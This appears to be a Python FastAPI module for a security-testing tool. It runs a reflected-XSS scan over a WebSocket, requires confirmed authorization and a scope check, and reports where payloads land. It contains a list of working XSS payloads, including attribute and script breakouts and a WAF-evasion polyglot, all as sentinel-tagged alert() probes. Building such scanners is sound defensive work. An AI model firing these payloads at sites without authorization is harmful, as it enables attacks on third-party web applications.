"""XSS — reflected-XSS detection with context-aware payloads.

WS  /ws/xss
    client -> server:
        {"url": "...FUZZ...", "method":"GET"|"POST", "body":"", "headers":{},
         "cookies":{}, "allow_private": false, "rate_per_sec": 8,
         "confirm_auth": true}

    server -> client:
        {"type":"started",  "url","total_payloads"}
        {"type":"attempt",  "payload","status","length","elapsed_ms","reflected","context"}
        {"type":"finding",  "severity","payload","context","evidence","confirmed"}
        {"type":"progress", "done","total","findings"}
        {"type":"done",     "elapsed","findings","stopped"}
        {"type":"error",    "detail"}
"""
from __future__ import annotations

import asyncio
import logging
import time
import uuid

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from lib import web_fuzz
from lib.errors import ErrorCode, MhpError, ws_error
from lib.validators import validate_url

logger = logging.getLogger(__name__)

router = APIRouter(tags=["xss"])

# Each payload is paired with a sentinel; we generate per-session sentinels to
# avoid collisions across runs. The {S} placeholder is replaced with the sentinel.
PAYLOAD_TEMPLATES = [
    # Classic
    "<script>alert('{S}')</script>",
    "<img src=x onerror=alert('{S}')>",
    "<svg/onload=alert('{S}')>",
    # Attribute breakout
    "\"><script>alert('{S}')</script>",
    "'><script>alert('{S}')</script>",
    "\" autofocus onfocus=alert('{S}') x=\"",
    "' autofocus onfocus=alert('{S}') x='",
    # JS string breakout
    "';alert('{S}');//",
    "\";alert('{S}');//",
    "</script><script>alert('{S}')</script>",
    # URL/href
    "javascript:alert('{S}')",
    # Polyglots (DOMpurify/WAF stress)
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{S}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{S}')//>\\x3e",
    # Mixed
    "<iframe srcdoc=\"<script>alert('{S}')</script>\">",
    "<details open ontoggle=alert('{S}')>",
    "<body onload=alert('{S}')>",
]


def classify_context(body: str, payload: str) -> str:
    """Quick heuristic for where the payload landed."""
    idx = body.find(payload)
    if idx < 0:
        return "not-reflected"
    pre = body[max(0, idx - 80):idx].lower()
    post = body[idx + len(payload):idx + len(payload) + 40].lower()
    if "<script" in pre and "</script>" in post:
        return "js-block"
    if any(c in pre[-30:] for c in ("\"", "'")) and any(c in post[:5] for c in ("\"", "'", " ", ">")):
        return "html-attribute"
    if "href=" in pre[-20:] or "src=" in pre[-20:]:
        return "url-attribute"
    return "html-body"


@router.websocket("/ws/xss")
async def xss_ws(ws: WebSocket) -> None:
    await ws.accept()
    stop = asyncio.Event()

    async def listen_for_stop() -> None:
        try:
            while True:
                msg = await ws.receive_json()
                if isinstance(msg, dict) and msg.get("action") == "stop":
                    stop.set(); return
        except WebSocketDisconnect:
            stop.set()
        except Exception:
            stop.set()

    try:
        init = await ws.receive_json()
        url = str(init.get("url", "")).strip()
        try:
            url = validate_url(url, field="url")
        except MhpError as exc:
            await ws.send_json(ws_error(exc.code, exc.message))
            await ws.close(); return
        tmpl = web_fuzz.FuzzTemplate(
            url=url,
            method=str(init.get("method", "GET")).upper(),
            body=str(init.get("body", "")),
            headers=dict(init.get("headers") or {}),
            cookies=dict(init.get("cookies") or {}),
        )
        if not tmpl.has_marker():
            await ws.send_json(ws_error(
                ErrorCode.BAD_REQUEST,
                f"Place '{web_fuzz.DEFAULT_MARKER}' in the URL, body, header, or cookie value to mark where payloads go",
            ))
            await ws.close(); return

        if not bool(init.get("confirm_auth", False)):
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Confirm you have authorization to test this target before running",
            ))
            await ws.close(); return

        allow_private = bool(init.get("allow_private", False))
        ok, reason = web_fuzz.check_scope(url, allow_private)
        if not ok:
            await ws.send_json(ws_error(ErrorCode.TARGET_DENIED, reason))
            await ws.close(); return

        sentinel = "MHP" + uuid.uuid4().hex[:8]
        payloads = [tmpl_str.format(S=sentinel) for tmpl_str in PAYLOAD_TEMPLATES]
        total = len(payloads)
        rate = max(1, min(int(init.get("rate_per_sec", 8)), 30))

        await ws.send_json({"type": "started", "url": url, "total_payloads": total})

        listener = asyncio.create_task(listen_for_stop())
        t0 = time.monotonic()
        done = 0
        findings = 0

        async def on_result(r: web_fuzz.FuzzResponse) -> None:
            nonlocal done, findings
            done += 1
            reflected = sentinel in r.body
            context = classify_context(r.body, r.payload) if reflected else "not-reflected"
            await ws.send_json({
                "type": "attempt", "payload": r.payload, "status": r.status,
                "length": r.length, "elapsed_ms": r.elapsed_ms,
                "reflected": reflected, "context": context,
            })
            if reflected and context != "not-reflected":
                findings += 1
                # Confirmed = full payload chars survived and we're in an executable context.
                exec_chars = any(c in r.payload for c in ("<", ">", "(", ")"))
                full_intact = r.payload in r.body
                confirmed = full_intact and exec_chars and context in (
                    "html-body", "html-attribute", "js-block",
                )
                severity = "high" if confirmed else "warn"
                evidence = r.body[max(0, r.body.find(r.payload) - 60):r.body.find(r.payload) + len(r.payload) + 60]
                await ws.send_json({
                    "type": "finding", "severity": severity,
                    "payload": r.payload, "context": context,
                    "evidence": evidence, "confirmed": confirmed,
                })
            if done % 2 == 0 or done == total:
                await ws.send_json({"type": "progress",
                                    "done": done, "total": total, "findings": findings})

        await web_fuzz.run_payloads(tmpl, payloads, on_result,
                                    concurrency=4, rate_per_sec=rate,
                                    stop=stop)
        listener.cancel()
        await ws.send_json({"type": "done",
                            "elapsed": round(time.monotonic() - t0, 2),
                            "findings": findings, "stopped": stop.is_set()})
    except WebSocketDisconnect:
        stop.set()
    except Exception:
        logger.exception("xss_ws unhandled exception")
        try:
            await ws.send_json(ws_error(
                ErrorCode.INTERNAL,
                "internal error during XSS scan",
            ))
        except Exception:
            pass
    finally:
        try:
            await ws.close()
        except Exception:
            pass
